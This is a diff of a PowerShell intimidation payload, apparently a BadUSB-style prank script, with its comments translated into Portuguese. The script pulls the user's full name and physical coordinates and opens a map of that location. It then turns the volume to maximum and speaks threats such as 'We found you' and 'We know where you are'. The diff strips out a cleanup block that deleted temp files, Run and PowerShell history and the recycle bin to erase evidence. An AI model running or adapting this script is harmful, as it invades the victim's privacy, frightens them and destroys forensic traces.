@@ -1,21 +1,17 @@
 function Get-fullName {
 
     try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
-    }
- 
- # If no name is detected function will return $env:UserName 
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
-    return $env:UserName
-    -ErrorAction SilentlyContinue
+        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
+        $fullName = ("$fullName").TrimStart("Full Name")
     }
 
-    return $fullName 
+    # Se nenhum nome for detectado, retorna $env:UserName
+    catch {
+        Write-Error "No name was detected"
+        return $env:UserName
+    }
 
+    return $fullName
 }
 
 $FN = Get-fullName
@@ -23,56 +19,51 @@ $FN = Get-fullName
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <#
-
-.NOTES 
-	This is to get the current Latitude and Longitude of your target
+.NOTES
+    Obtém a latitude e longitude atuais do computador
 #>
 
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
+function Get-GeoLocation {
+    try {
+        Add-Type -AssemblyName System.Device
+        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+        $GeoWatcher.Start()
 
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
+        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+            Start-Sleep -Milliseconds 100
+        }
 
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
+        if ($GeoWatcher.Permission -eq 'Denied') {
+            Write-Error 'Access Denied for Location Information'
+        } else {
+            $GeoWatcher.Position.Location | Select Latitude,Longitude
+        }
+    }
+    catch {
+        Write-Error "No coordinates found"
+        return "No Coordinates found"
+    }
 }
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
+.NOTES
+    Pausa o script até detectar movimento do mouse
 #>
 
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
+function Pause-Script {
+    Add-Type -AssemblyName System.Windows.Forms
+    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
+    $o = New-Object -ComObject WScript.Shell
 
     while (1) {
         $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
             break
         }
         else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
         }
     }
 }
@@ -89,19 +80,19 @@ $Lon = $GL[1].Substring(10) -replace ".$"
 
 Pause-Script
 
-# Opens their browser with a map of their current location
+# Abre o navegador com um mapa da localização atual
 
 Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
 
 Start-Sleep -s 3
 
-# Sets Volume to max level
+# Coloca o volume no máximo
 
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+$k = [Math]::Ceiling(100/2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }
 
-# Sets up speech module 
+# Voz do Windows
 
-$s=New-Object -ComObject SAPI.SpVoice
+$s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
 $s.Speak("We found you $FN")
 $s.Speak("We know where you are")
@@ -109,27 +100,4 @@ $s.Speak("We are everywhere")
 $s.Speak("We do not forgive, we do not forget")
 $s.Speak("Expect us")
 
-
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+# Fim do script. Nenhum arquivo, histórico ou registro é apagado.
